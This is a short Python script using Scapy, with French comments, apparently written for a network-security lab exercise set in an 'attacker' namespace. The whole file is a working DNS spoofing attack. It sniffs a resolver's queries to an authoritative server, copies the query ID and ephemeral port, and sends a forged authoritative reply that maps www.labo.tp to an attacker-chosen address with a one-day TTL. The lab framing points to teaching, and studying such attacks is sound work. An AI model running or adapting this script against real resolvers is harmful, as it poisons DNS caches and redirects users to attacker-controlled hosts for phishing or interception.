#!/usr/bin/env python3
# attacker_spoof.py — à exécuter dans le namespace "attacker"
#
# ip netns exec attacker python3 attacker_spoof.py
#
from scapy.all import (
    sniff, send, IP, UDP, DNS, DNSQR, DNSRR
)

AUTH_IP      = "10.0.3.10"     # adresse IP légitime du serveur auth
RESOLVER_IP  = "10.0.3.1"      # interface N3 du resolver (destinataire)
TARGET_QNAME = b"www.labo.tp."
FAKE_IP      = "203.0.113.66"  # adresse imposée par l'attaquant
IFACE        = "veth-att"

def handle_packet(pkt):
    if not pkt.haslayer(DNS):
        return
    dns = pkt[DNS]

    # On ne traite que les REQUETES (qr=0) vers auth, pour le nom cible
    if dns.qr != 0 or dns.qdcount == 0:
        return
    if pkt[DNSQR].qname != TARGET_QNAME:
        return
    if pkt[IP].dst != AUTH_IP:
        return

    qid        = dns.id
    client_port = pkt[UDP].sport     # port éphémère choisi par resolver
    print(f"[attacker] Requête interceptée : qid={qid} "
          f"port_source_resolver={client_port} "
          f"qname={pkt[DNSQR].qname.decode()}")

    # Construction de la réponse usurpée
    spoofed = (
        IP(src=AUTH_IP, dst=RESOLVER_IP) /
        UDP(sport=53, dport=client_port) /
        DNS(
            id=qid,
            qr=1, aa=1, rd=1, ra=0,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=TARGET_QNAME,
                type="A", ttl=86400,
                rdata=FAKE_IP
            )
        )
    )
    send(spoofed, iface=IFACE, verbose=0)
    print(f"[attacker] Réponse falsifiée envoyée : "
          f"{TARGET_QNAME.decode()} -> {FAKE_IP}")

print("[attacker] En écoute sur", IFACE, "...")
sniff(
    iface=IFACE,
    filter=f"udp port 53 and dst host {AUTH_IP}",
    prn=handle_packet,
    store=0
)
